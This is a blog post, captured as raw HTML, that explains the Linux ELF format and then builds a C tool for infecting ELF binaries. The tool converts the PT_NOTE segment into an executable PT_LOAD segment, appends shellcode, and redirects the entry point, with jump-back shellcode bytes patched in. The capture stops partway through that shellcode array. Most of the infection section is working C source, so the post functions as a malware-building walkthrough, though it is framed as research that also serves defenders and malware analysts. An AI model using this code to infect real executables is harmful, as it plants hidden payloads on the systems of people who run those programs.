<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>Infecting Linux ELF Files | Stephan Bridger</title><meta name=keywords content="ELF,linux,research,development,C"><meta name=description content="Elfland
Lately I&rsquo;ve been thinking about Linux internals and malware. In this blog post, we&rsquo;re going to hark about the ELFs. Just as Windows has its own executable format, so too does Linux.
If we look at the source code1 to the Executable and Linkable Format specification in elf.h, we can see the definition of the ELF header and some of its core machinery to get an idea of how it works."><meta name=author content="Stephan Bridger"><link rel=canonical href=https://hexagram.foo/posts/infecting-linux-elf-files/><link crossorigin=anonymous href=/assets/css/stylesheet.793a8ff569756a2027f6b93c889ec37d86f8750c1c450ebac658c67d856ed6af.css integrity="sha256-eTqP9Wl1aiAn9rk8iJ7DfYb4dQwcRQ66xljGfYVu1q8=" rel="preload stylesheet" as=style><link rel=icon href=https://hexagram.foo/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://hexagram.foo/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://hexagram.foo/favicon-32x32.png><link rel=apple-touch-icon href=https://hexagram.foo/apple-touch-icon.png><link rel=mask-icon href=https://hexagram.foo/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=https://hexagram.foo/posts/infecting-linux-elf-files/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:url" content="https://hexagram.foo/posts/infecting-linux-elf-files/"><meta property="og:site_name" content="Stephan Bridger"><meta property="og:title" content="Infecting Linux ELF Files"><meta property="og:description" content="Elfland Lately I’ve been thinking about Linux internals and malware. In this blog post, we’re going to hark about the ELFs. Just as Windows has its own executable format, so too does Linux.
If we look at the source code1 to the Executable and Linkable Format specification in elf.h, we can see the definition of the ELF header and some of its core machinery to get an idea of how it works."><meta property="og:locale" content="en"><meta property="og:type" content="article"><meta property="article:section" content="posts"><meta property="article:published_time" content="2025-02-23T00:00:00+00:00"><meta property="article:modified_time" content="2025-02-23T00:00:00+00:00"><meta property="article:tag" content="ELF"><meta property="article:tag" content="Linux"><meta property="article:tag" content="Research"><meta property="article:tag" content="Development"><meta property="article:tag" content="C"><meta property="og:image" content="https://hexagram.foo/fog.jpeg"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://hexagram.foo/fog.jpeg"><meta name=twitter:title content="Infecting Linux ELF Files"><meta name=twitter:description content="Elfland
Lately I&rsquo;ve been thinking about Linux internals and malware. In this blog post, we&rsquo;re going to hark about the ELFs. Just as Windows has its own executable format, so too does Linux.
If we look at the source code1 to the Executable and Linkable Format specification in elf.h, we can see the definition of the ELF header and some of its core machinery to get an idea of how it works."><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://hexagram.foo/posts/"},{"@type":"ListItem","position":2,"name":"Infecting Linux ELF Files","item":"https://hexagram.foo/posts/infecting-linux-elf-files/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Infecting Linux ELF Files","name":"Infecting Linux ELF Files","description":"Elfland Lately I\u0026rsquo;ve been thinking about Linux internals and malware. In this blog post, we\u0026rsquo;re going to hark about the ELFs. Just as Windows has its own executable format, so too does Linux.\nIf we look at the source code1 to the Executable and Linkable Format specification in elf.h, we can see the definition of the ELF header and some of its core machinery to get an idea of how it works.\n","keywords":["ELF","linux","research","development","C"],"articleBody":"Elfland Lately I’ve been thinking about Linux internals and malware. In this blog post, we’re going to hark about the ELFs. Just as Windows has its own executable format, so too does Linux.\nIf we look at the source code1 to the Executable and Linkable Format specification in elf.h, we can see the definition of the ELF header and some of its core machinery to get an idea of how it works.\ntypedef struct elf64_hdr { unsigned char e_ident[EI_NIDENT]; /* ELF \"magic number\" */ Elf64_Half e_type; Elf64_Half e_machine; Elf64_Word e_version; Elf64_Addr e_entry; /* Entry point virtual address */ Elf64_Off e_phoff; /* Program header table file offset */ Elf64_Off e_shoff; /* Section header table file offset */ Elf64_Word e_flags; Elf64_Half e_ehsize; Elf64_Half e_phentsize; Elf64_Half e_phnum; Elf64_Half e_shentsize; Elf64_Half e_shnum; Elf64_Half e_shstrndx; } Elf64_Ehdr; /* These constants define the permissions on sections in the program header, p_flags. */ #define PF_R 0x4 #define PF_W 0x2 #define PF_X 0x1 typedef struct elf64_phdr { Elf64_Word p_type; Elf64_Word p_flags; Elf64_Off p_offset; /* Segment file offset */ Elf64_Addr p_vaddr; /* Segment virtual address */ Elf64_Addr p_paddr; /* Segment physical address */ Elf64_Xword p_filesz; /* Segment size in file */ Elf64_Xword p_memsz; /* Segment size in memory */ Elf64_Xword p_align; /* Segment alignment, file \u0026 memory */ } Elf64_Phdr; typedef struct elf64_shdr { Elf64_Word sh_name; /* Section name, index in string table */ Elf64_Word sh_type; /* Type of section */ Elf64_Xword sh_flags; /* Miscellaneous section attributes */ Elf64_Addr sh_addr; /* Section virtual addr at execution */ Elf64_Off sh_offset; /* Section file offset */ Elf64_Xword sh_size; /* Size of section in bytes */ Elf64_Word sh_link; /* Index of another section */ Elf64_Word sh_info; /* Additional section information */ Elf64_Xword sh_addralign; /* Section alignment */ Elf64_Xword sh_entsize; /* Entry size if section holds table */ } Elf64_Shdr; typedef struct elf64_note { Elf64_Word n_namesz; /* Name size */ Elf64_Word n_descsz; /* Content size */ Elf64_Word n_type; /* Content type */ } Elf64_Nhdr; typedef struct elf64_sym { Elf64_Word st_name; /* Symbol name, index in string tbl */ unsigned char st_info; /* Type and binding attributes */ unsigned char st_other; /* No defined meaning, 0 */ Elf64_Half st_shndx; /* Associated section index */ Elf64_Addr st_value; /* Value of the symbol */ Elf64_Xword st_size; /* Associated symbol size */ } Elf64_Sym; “OK, so what?” We’re interested in how the elf64_hdr works. And it turns out it essentially uses a lookup table. The offset to the program header table is located in e_phoff. The program header table itself is defined by various elf64_phdr segments.\nAdditionally, elf64_shdr section headers hold data, variables, and linking information2:\n.text for code instructions, .rodata for read-only data, .plt for the procedure linkage table, .data segment for initialized data, .bss section for uninitialized variables, .got.plt section for dynamic interactions between the global offset table and procedure linkage table, .dynsym for dynamic symbols imported from shared libraries, .dynstr for dynamic strings, .rel for relocation symbols, .hash for hash table lookups, .symtab for all symbols, .strtab for a string table, .shstrtab for a table to resolve the names of each of the tables themselves, .ctors and .dtors - constructors and destructors - function pointers for initialization and finalization sequences before any code in the main body of the program executes. However, many of these section headers aren’t actually necessary for execution and can be stripped out from the binary. They mostly hold information for linking and debugging purposes.\nOur primary interest is in the elf64_phdr table segments. This table controls what should or shouldn’t be loaded into memory at runtime.3 When an ELF file is executed, it gets mapped4 by mmap according to whatever is specified by the ELF file program headers.\nLoading If we take a look with strace we can see a bit about how binaries are loaded and executed.\n$ strace /usr/bin/ls execve(\"/usr/bin/ls\", [\"ls\"], 0x7ffcba885000 /* 24 vars */) = 0 brk(NULL) = 0x5dca6c78b000 mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x749cec0f8000 access(\"/etc/ld.so.preload\", R_OK) = -1 ENOENT (No such file or directory) openat(AT_FDCWD, \"/etc/ld.so.cache\", O_RDONLY|O_CLOEXEC) = 3 fstat(3, {st_mode=S_IFREG|0644, st_size=64795, ...}) = 0 mmap(NULL, 64795, PROT_READ, MAP_PRIVATE, 3, 0) = 0x749cec0e8000 close(3) = 0 openat(AT_FDCWD, \"/lib/x86_64-linux-gnu/libselinux.so.1\", O_RDONLY|O_CLOEXEC) = 3 read(3, \"\\177ELF\\2\\1\\1\\0\\0\\0\\0\\0\\0\\0\\0\\0\\3\\0\u003e\\0\\1\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\"..., 832) = 832 fstat(3, {st_mode=S_IFREG|0644, st_size=174472, ...}) = 0 mmap(NULL, 181960, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0x749cec0bb000 mmap(0x749cec0c1000, 118784, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x6000) = 0x749cec0c1000 mmap(0x749cec0de000, 24576, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x23000) = 0x749cec0de000 mmap(0x749cec0e4000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x29000) = 0x749cec0e4000 mmap(0x749cec0e6000, 5832, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0x749cec0e6000 close(3) = 0 openat(AT_FDCWD, \"/lib/x86_64-linux-gnu/libc.so.6\", O_RDONLY|O_CLOEXEC) = 3 read(3, \"\\177ELF\\2\\1\\1\\3\\0\\0\\0\\0\\0\\0\\0\\0\\3\\0\u003e\\0\\1\\0\\0\\0\\220\\243\\2\\0\\0\\0\\0\\0\"..., 832) = 832 pread64(3, \"\\6\\0\\0\\0\\4\\0\\0\\0@\\0\\0\\0\\0\\0\\0\\0@\\0\\0\\0\\0\\0\\0\\0@\\0\\0\\0\\0\\0\\0\\0\"..., 784, 64) = 784 fstat(3, {st_mode=S_IFREG|0755, st_size=2125328, ...}) = 0 pread64(3, \"\\6\\0\\0\\0\\4\\0\\0\\0@\\0\\0\\0\\0\\0\\0\\0@\\0\\0\\0\\0\\0\\0\\0@\\0\\0\\0\\0\\0\\0\\0\"..., 784, 64) = 784 mmap(NULL, 2170256, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0x749cebe00000 mmap(0x749cebe28000, 1605632, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x28000) = 0x749cebe28000 mmap(0x749cebfb0000, 323584, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x1b0000) = 0x749cebfb0000 mmap(0x749cebfff000, 24576, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x1fe000) = 0x749cebfff000 mmap(0x749cec005000, 52624, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0x749cec005000 close(3) = 0 openat(AT_FDCWD, \"/lib/x86_64-linux-gnu/libpcre2-8.so.0\", O_RDONLY|O_CLOEXEC) = 3 read(3, \"\\177ELF\\2\\1\\1\\0\\0\\0\\0\\0\\0\\0\\0\\0\\3\\0\u003e\\0\\1\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\"..., 832) = 832 fstat(3, {st_mode=S_IFREG|0644, st_size=625344, ...}) = 0 mmap(NULL, 627472, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0x749cec021000 mmap(0x749cec023000, 450560, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x2000) = 0x749cec023000 mmap(0x749cec091000, 163840, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x70000) = 0x749cec091000 mmap(0x749cec0b9000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x97000) = 0x749cec0b9000 close(3) = 0 mmap(NULL, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x749cec01e000 arch_prctl(ARCH_SET_FS, 0x749cec01e800) = 0 set_tid_address(0x749cec01ead0) = 86655 set_robust_list(0x749cec01eae0, 24) = 0 rseq(0x749cec01f120, 0x20, 0, 0x53053053) = 0 mprotect(0x749cebfff000, 16384, PROT_READ) = 0 mprotect(0x749cec0b9000, 4096, PROT_READ) = 0 mprotect(0x749cec0e4000, 4096, PROT_READ) = 0 mprotect(0x5dca4b2a4000, 8192, PROT_READ) = 0 mprotect(0x749cec130000, 8192, PROT_READ) = 0 prlimit64(0, RLIMIT_STACK, NULL, {rlim_cur=8192*1024, rlim_max=RLIM64_INFINITY}) = 0 ... // snipped The kernel first calls execve, effectively forking the program by saying “replacing my current program with this one.”5\nThen a call is made to brk to locate the end of the data segment67. The ELF header then gets parsed8 to determine how to process the program headers and it is mapped into memory.\n// snippet from fs/binfmt_elf.c /** * load_elf_phdrs() - load ELF program headers * @elf_ex: ELF header of the binary whose program headers should be loaded * @elf_file: the opened ELF binary file * * Loads ELF program headers from the binary file elf_file, which has the ELF * header pointed to by elf_ex, into a newly allocated array. The caller is * responsible for freeing the allocated data. Returns NULL upon failure. */ static struct elf_phdr *load_elf_phdrs(const struct elfhdr *elf_ex, struct file *elf_file) { struct elf_phdr *elf_phdata = NULL; int retval = -1; unsigned int size; /* * If the size of this structure has changed, then punt, since * we will be doing the wrong thing. */ if (elf_ex-\u003ee_phentsize != sizeof(struct elf_phdr)) goto out; /* Sanity check the number of program headers... */ /* ...and their total size. */ size = sizeof(struct elf_phdr) * elf_ex-\u003ee_phnum; if (size == 0 || size \u003e 65536 || size \u003e ELF_MIN_ALIGN) goto out; elf_phdata = kmalloc(size, GFP_KERNEL); if (!elf_phdata) goto out; /* Read in the program headers */ retval = elf_read(elf_file, elf_phdata, size, elf_ex-\u003ee_phoff); out: if (retval) { kfree(elf_phdata); elf_phdata = NULL; } return elf_phdata; } The ELF interpeter handles how the file is loaded. It resolves the symbols, segments, and necessary information to run the binary.\nIn this case, the dynamic linker ld.so is called since our binary is dynamically linked. This resolves the dependencies necessary for execution.\nAnd mmap gets called to allocate memory for all the necessary virtual memory mappings: the stack, heap, and anonymous mappings.\nFor each shared library the kernel needs, the loader uses mmap() to map the segments and each library into memory at the addresses specified by the ELF headers. Appropriate permissions are set. Relocations are processed by the linker9 and calls to mprotect set some memory locations into read-only mode. When the program is done executing, it calls unmap().\nAnd actually, a lot more than this happens. If we step through the program with gdb we see that strace is only giving us a high level overview.\nWe only see the syscalls. But execution of the run time dynamic linker actually begins at _dl_start within elf/rtld.c, and it’s much more sophisticated.10\n$ cat breakpoints.log | grep Breakpoint | cut -f3 -d' ' | awk '!seen[$0]++' 0x00007ffff7fe4540 _dl_start elf_get_dynamic_info _dl_start_final _dl_setup_hash _dl_sysdep_start process_envvars _dl_new_object _dl_map_object_deps 0x00007ffff7fc7abe _dl_map_object _dl_map_object_from_fd _dl_relocate_object elf_machine_lazy_rel __GI_mprotect elf_machine_runtime_setup __GI_munmap We’ll save this matter for a different post. But for now, just know that our strace output is in no way an exhaustive or full explanation of all the things that occur to enable loading our ELF binary. Though it does give us a view of the system calls that occur, which is helpful for tracing and debugging, it still conceals a lot of implementation details.\nSegment Types For each ELF program header segment, the p_type field tells the kernel how to interpret the header. For reference: the elf64_phdr structure and possible p_type values.\ntypedef struct elf64_phdr { Elf64_Word p_type; Elf64_Word p_flags; Elf64_Off p_offset; /* Segment file offset */ Elf64_Addr p_vaddr; /* Segment virtual address */ Elf64_Addr p_paddr; /* Segment physical address */ Elf64_Xword p_filesz; /* Segment size in file */ Elf64_Xword p_memsz; /* Segment size in memory */ Elf64_Xword p_align; /* Segment alignment, file \u0026 memory */ } Elf64_Phdr; Type Value Description PT_NULL 0 Unused element PT_LOAD 1 Loadable segment described by p_filesz and p_memsz PT_DYNAMIC 2 Dynamic linking info PT_INTERP 3 Interpreter to invoke; usually ld PT_NOTE 4 Location and size of auxiliary info PT_SHLIB 5 Reserved PT_PHDR 6 Specifies location and size of program header table itself PT_TLS 7 Specifies a thread local storage template PT_LOPROC 0x70000000 Reserved PT_HIPROC 0x7fffffff Reserved For example, the PT_DYNAMIC segment specifies dynamic linking information. And the PT_INTERP segment specifies the interpreter to invoke. This is usually the dynamic linker ld.\n$ readelf -p .interp /usr/bin/ls String dump of section '.interp': [ 0] /lib64/ld-linux-x86-64.so.2 But segments marked PT_LOAD denote loadable segments. PT_LOAD segments are described by the p_filesz and p_memsz fields.11 The bytes from PT_LOAD segments are mapped to the beginning of the memory segment. And later we will see that we actually have more granular control over where, exactly, things get mapped to via the p_vaddr field.\nIf we use readelf with the -l flag, we can see an ELF’s program headers and each of their respective permission Flags: read, write, or executable.\n$ readelf -l /usr/bin/ls Elf file type is DYN (Position-Independent Executable file) Entry point 0x6d30 There are 13 program headers, starting at offset 64 Program Headers: Type Offset VirtAddr PhysAddr FileSiz MemSiz Flags Align PHDR 0x0000000000000040 0x0000000000000040 0x0000000000000040 0x00000000000002d8 0x00000000000002d8 R 0x8 INTERP 0x0000000000000318 0x0000000000000318 0x0000000000000318 0x000000000000001c 0x000000000000001c R 0x1 [Requesting program interpreter: /lib64/ld-linux-x86-64.so.2] LOAD 0x0000000000000000 0x0000000000000000 0x0000000000000000 0x00000000000036f8 0x00000000000036f8 R 0x1000 LOAD 0x0000000000004000 0x0000000000004000 0x0000000000004000 0x0000000000014db1 0x0000000000014db1 R E 0x1000 LOAD 0x0000000000019000 0x0000000000019000 0x0000000000019000 0x00000000000071b8 0x00000000000071b8 R 0x1000 LOAD 0x0000000000020f30 0x0000000000021f30 0x0000000000021f30 0x0000000000001348 0x00000000000025e8 RW 0x1000 DYNAMIC 0x0000000000021a38 0x0000000000022a38 0x0000000000022a38 0x0000000000000200 0x0000000000000200 RW 0x8 NOTE 0x0000000000000338 0x0000000000000338 0x0000000000000338 0x0000000000000030 0x0000000000000030 R 0x8 NOTE 0x0000000000000368 0x0000000000000368 0x0000000000000368 0x0000000000000044 0x0000000000000044 R 0x4 GNU_PROPERTY 0x0000000000000338 0x0000000000000338 0x0000000000000338 0x0000000000000030 0x0000000000000030 R 0x8 GNU_EH_FRAME 0x000000000001e170 0x000000000001e170 0x000000000001e170 0x00000000000005ec 0x00000000000005ec R 0x4 GNU_STACK 0x0000000000000000 0x0000000000000000 0x0000000000000000 0x0000000000000000 0x0000000000000000 RW 0x10 GNU_RELRO 0x0000000000020f30 0x0000000000021f30 0x0000000000021f30 0x00000000000010d0 0x00000000000010d0 R 0x1 Section to Segment mapping: Segment Sections... 00 01 .interp 02 .interp .note.gnu.property .note.gnu.build-id .note.ABI-tag .gnu.hash .dynsym .dynstr .gnu.version .gnu.version_r .rela.dyn .rela.plt 03 .init .plt .plt.got .plt.sec .text .fini 04 .rodata .eh_frame_hdr .eh_frame 05 .init_array .fini_array .data.rel.ro .dynamic .got .data .bss 06 .dynamic 07 .note.gnu.property 08 .note.gnu.build-id .note.ABI-tag 09 .note.gnu.property 10 .eh_frame_hdr 11 12 .init_array .fini_array .data.rel.ro .dynamic .got The program header we’re interested in is the NOTE segment. As you can see above, this particular header is not intended to be executable. By default it’s read-only. The PT_NOTE header specifies an auxiliary field for storing information. We can see its construction here.\nFor example, a software vendor might desire to mark an executable with information to indicate remarks about compatibility. Together, the PT_NOTE section consists of an array of 4-byte words.\n/* Note header in a PT_NOTE section */ typedef struct elf64_note { Elf64_Word n_namesz; /* Name size */ Elf64_Word n_descsz; /* Content size */ Elf64_Word n_type; /* Content type */ } Elf64_Nhdr; The sizes for all of the ELF’s corresponding types and sizes can be found in elf.h in almost any Linux repo.\n/* Standard ELF types. */ #include /* Type for a 16-bit quantity. */ typedef uint16_t Elf32_Half; typedef uint16_t Elf64_Half; /* Types for signed and unsigned 32-bit quantities. */ typedef uint32_t Elf32_Word; typedef int32_t Elf32_Sword; typedef uint32_t Elf64_Word; typedef int32_t Elf64_Sword; /* Types for signed and unsigned 64-bit quantities. */ typedef uint64_t Elf32_Xword; typedef int64_t Elf32_Sxword; typedef uint64_t Elf64_Xword; typedef int64_t Elf64_Sxword; /* Type of addresses. */ typedef uint32_t Elf32_Addr; typedef uint64_t Elf64_Addr; /* Type of file offsets. */ typedef uint32_t Elf32_Off; typedef uint64_t Elf64_Off; /* Type for section indices, which are 16-bit quantities. */ typedef uint16_t Elf32_Section; typedef uint16_t Elf64_Section; /* Type for version symbol information. */ typedef Elf32_Half Elf32_Versym; typedef Elf64_Half Elf64_Versym; If we want to see the PT_NOTE or SHT_NOTE segments of ELF binaries for ourselves, we can glean them using the readelf utility with the -n or --notes flag.\n$ readelf -n /usr/bin/ls Displaying notes found in: .note.gnu.property Owner Data size Description GNU 0x00000020 NT_GNU_PROPERTY_TYPE_0 Properties: x86 feature: IBT, SHSTK x86 ISA needed: x86-64-baseline Displaying notes found in: .note.gnu.build-id Owner Data size Description GNU 0x00000014 NT_GNU_BUILD_ID (unique build ID bitstring) Build ID: 3eca7e3905b37d48cf0a88b576faa7b95cc3097b Displaying notes found in: .note.ABI-tag Owner Data size Description GNU 0x00000010 NT_GNU_ABI_TAG (ABI version tag) OS: Linux, ABI: 3.2.0 Constructing an Infector Now that we have an idea about how ELF files are structured and operate, we can further clarify our objectives. What do we want to do? First we want to read and write.\nBut before we can do so, we need to set some declarations based on the ELF structures to help us construct our gadgets:\nElf64_Ehdr* read_elf64_header(int fd); Elf64_Phdr* read_elf64_program_headers(int fd, uint64_t phoff, uint16_t phnum); int write_elf64_program_headers(int fd, uint64_t phoff, uint16_t phnum, Elf64_Phdr *phdrs); int write_elf64_header(int fd, Elf64_Ehdr *header); unsigned char* read_file(const char *filename, size_t *length); void write_u64_le(unsigned char *dest, uint64_t val); void patch(unsigned char **shellcode, size_t *shellcode_len, uint64_t entry_point, uint64_t start_offset); We want to open and read both an ELF binary and a shellcode file to some allocated memory buffers. Our main function:\nint main(int argc, char **argv) { if (argc != 3) { fprintf(stderr, \"Usage: %s \\n\", argv[0]); exit(1); } const char *elf_path = argv[1]; const char *bin_path = argv[2]; // Open ELF file with RW permissions int elf_fd = open(elf_path, O_RDWR); if (elf_fd \u003c 0) { fprintf(stderr, \"Error opening ELF file '%s': %s\\n\", elf_path, strerror(errno)); exit(1); } // Load shellcode from file size_t shellcode_len = 0; unsigned char *shellcode = read_file(bin_path, \u0026shellcode_len); if (shellcode == NULL) { fprintf(stderr, \"Error reading shellcode file '%s'\\n\", bin_path); close(elf_fd); exit(1); } // Parse ELF and program headers Elf64_Ehdr *elf_header = read_elf64_header(elf_fd); if (elf_header == NULL) { fprintf(stderr, \"Error reading ELF header\\n\"); close(elf_fd); free(shellcode); exit(1); } Elf64_Phdr *program_headers = read_elf64_program_headers(elf_fd, elf_header-\u003ee_phoff, elf_header-\u003ee_phnum); if (program_headers == NULL) { fprintf(stderr, \"Error reading program headers\\n\"); close(elf_fd); free(elf_header); free(shellcode); exit(1); } // snipped We first call out to our read_file function to get our shellcode. Once inside, we give fopen our filename and SEEK to the end of the file to get its size with ftell.\nWe call malloc against our file size to allocate a buffer, then call fread to read the file into the newly allocated buffer. If the function doesn’t error out, we return a pointer to the buffer.\n// Read entire contents of a file into a dynamically allocated buffer // File length is stored in *length // Return pointer to buffer on success, or NULL on failure unsigned char* read_file(const char *filename, size_t *length) { FILE *fp = fopen(filename, \"rb\"); if (fp == NULL) { fprintf(stderr, \"Error opening file '%s': %s\\n\", filename, strerror(errno)); return NULL; } if (fseek(fp, 0, SEEK_END) != 0) { fprintf(stderr, \"Error seeking in file '%s'\\n\", filename); fclose(fp); return NULL; } long file_size = ftell(fp); if (file_size \u003c 0) { fprintf(stderr, \"Error getting file size for '%s'\\n\", filename); fclose(fp); return NULL; } rewind(fp); unsigned char *buffer = malloc(file_size); if (buffer == NULL) { fprintf(stderr, \"Error allocating memory for file '%s'\\n\", filename); fclose(fp); return NULL; } size_t read_size = fread(buffer, 1, file_size, fp); if (read_size != (size_t)file_size) { fprintf(stderr, \"Error reading file '%s'\\n\", filename); free(buffer); fclose(fp); return NULL; } fclose(fp); *length = read_size; return buffer; } After returning from our call to read_file to get the shellcode buffer, we’re ready to call our ELF helper functions to parse both the ELF header and its program headers.\nWe use lseek and SEEK_SET to get an offset to the beginning of the ELF header and allocate it to memory with malloc. Then we get the program headers.\nThe resulting size of the array of program headers is the size of the ELF64_Phdr times the number of program headers phnum:\n// Read the ELF64 header from the given file descriptor // Return a pointer to an allocated Elf64_Ehdr structure on success, or NULL on failure Elf64_Ehdr* read_elf64_header(int fd) { if (lseek(fd, 0, SEEK_SET) \u003c 0) { fprintf(stderr, \"Error seeking to beginning of ELF file\\n\"); return NULL; } Elf64_Ehdr *header = malloc(sizeof(Elf64_Ehdr)); if (header == NULL) { fprintf(stderr, \"Error allocating memory for ELF header\\n\"); return NULL; } if (read(fd, header, sizeof(Elf64_Ehdr)) != sizeof(Elf64_Ehdr)) { fprintf(stderr, \"Error reading ELF header\\n\"); free(header); return NULL; } return header; } // Read ELF64 program headers from the given file descriptor at offset phoff // expecting phnum headers // Return a pointer to an allocated array of program headers // or NULL on failure Elf64_Phdr* read_elf64_program_headers(int fd, uint64_t phoff, uint16_t phnum) { if (lseek(fd, phoff, SEEK_SET) \u003c 0) { fprintf(stderr, \"Error seeking to program headers offset\\n\"); return NULL; } Elf64_Phdr *phdrs = malloc(sizeof(Elf64_Phdr) * phnum); if (phdrs == NULL) { fprintf(stderr, \"Error allocating memory for program headers\\n\"); return NULL; } size_t total_size = sizeof(Elf64_Phdr) * phnum; if (read(fd, phdrs, total_size) != (ssize_t)total_size) { fprintf(stderr, \"Error reading program headers from ELF file\\n\"); free(phdrs); return NULL; } return phdrs; } After we’ve read both our shellcode file and our ELF headers, allocating them to memory with malloc – we land back in main function once more.\nNow we do a few important things. First we store the original e_entry from the ELF header in original entry. We need this later.\nThen we get the file size of the target ELF binary with stat by accessing st_size. We save this physical file size offset in file_offset.\nThen we generate a memory_offset using a high address by adding 0xc00000000 to our file_offset. This memory_offset is the virtual addressing where we want to load our shellcode to when our ELF file gets mapped. The high addressing ensures our shellcode will be mapped far away from any of the other data. And it’s where we’re going to point e_entry.\nThen we alter the PT_NOTE into a PT_LOAD segment. We give it read and execute permissions. We set the p_offset field to our file_offset and our virtual memory address to the memory_offset.\nThen we adjust the p_memsz and p_filesz fields, incrementing them by the length of our shellcode – making room for it in the virtual file image mapping. And last, we patch the entry of the ELF header to point to our memory_offset where our malware will be mapped to.\n// Save the old entry point so we can jump later uint64_t original_entry = elf_header-\u003ee_entry; uint64_t sc_len = (uint64_t)shellcode_len; // Calculate offsets for patching the ELF and program headers struct stat st; if (fstat(elf_fd, \u0026st) != 0) { fprintf(stderr, \"Error getting ELF file metadata: %s\\n\", strerror(errno)); close(elf_fd); free(elf_header); free(program_headers); free(shellcode); exit(1); } uint64_t file_offset = st.st_size; uint64_t memory_offset = 0xc00000000ULL + file_offset; // Look for PT_NOTE section for (int i = 0; i \u003c elf_header-\u003ee_phnum; i++) { if (program_headers[i].p_type == PT_NOTE) { // Convert to a PT_LOAD section with values to load shellcode printf(\"[+] Found PT_NOTE section\\n\"); printf(\"[+] Changing to PT_LOAD\\n\"); program_headers[i].p_type = PT_LOAD; program_headers[i].p_flags = PF_R | PF_X; program_headers[i].p_offset = file_offset; program_headers[i].p_vaddr = memory_offset; program_headers[i].p_memsz += sc_len; program_headers[i].p_filesz += sc_len; // Patch the ELF header to start at the shellcode elf_header-\u003ee_entry = memory_offset; printf(\"[+] Patched e_entry\\n\"); break; } } // Patch shellcode to jump to the original entry point after finishing patch(\u0026shellcode, \u0026shellcode_len, elf_header-\u003ee_entry, original_entry); A few remarks about what’s going on here, exactly:\np_type = PT_LOAD; // Set PT_LOAD flag p_flags = PF_R | PF_X; // Set read and execute permissions p_offset = file_offset; // Set p_offset to the file_offset. The file_offset // is the size of the original ELF binary. // And what's at the *end* of our ELF? // The shellcode we append. p_vaddr = memory_offset; // The virtual address offset we want to map our // shellcode to. Equivalent to the file size // offset but at a higher address range, e.g. // 0xc00000000 p_memsz += sc_len; // Increase the number of bytes in the file // image of the segment by the length of // the shellcode p_filesz += sc_len; // Increase the number of bytes in the memory // image of the segment by the length of the // shellcode Lastly, use assign elf_header-\u003ee_entry = memory_offset, modifying the ELF entry to point to our memory offset where our shellcode will reside when it’s loaded.\nAnd Patch Me Up The next step is really important to understand. This is where we call our very helpful patch function.\n// Patch shellcode to jump to the original entry point after finishing patch(\u0026shellcode, \u0026shellcode_len, elf_header-\u003ee_entry, original_entry); And once inside, there’s an additional array of shellcode called jump_shellcode. We patch this array with the values we pass to the patch function.\nWe then modify the original shellcode buffer from earlier – extending it by the size of the additional jump_shellcode array.\nAfter our original shellcode array is extended by the size of the jump_shellcode array, we memcpy the additional patched jump_shellcode into the extended shellcode buffer space, aka at the end of our malware code. And finally we update our shellcode buffer and length pointers to our new updated shellcode buffer and length pointers.\n// Patch in shellcode from jumpstart.s to resolve original_entry point void patch(unsigned char **shellcode, size_t *shellcode_len, uint64_t entry_point, uint64_t original_entry) { unsigned char jump_shellcode[] = { 0xe8, 0x2d, 0x00, 0x00, 0x00, 0x49, 0xb9, 0xef, 0xbe, 0xad, 0xde, 0xef, 0xbe, 0xad, 0xde, 0x49, 0xba, 0x0d, 0xf0, 0xad, 0xba, 0x0d, 0xf0, 0xad, 0xba, 0x49, 0xbb, 0xb5, 0x00, 0x6b, 0xb1, 0xb5, 0x00, 0x6b, 0xb1, 0x4c, 0x29, 0xc8, 0x48, 0x83, 0xe8, 0x05, 0x4c, 0x29, 0xd0, 0x4c, 0x01, 0xd8, 0xff, 0xe0, 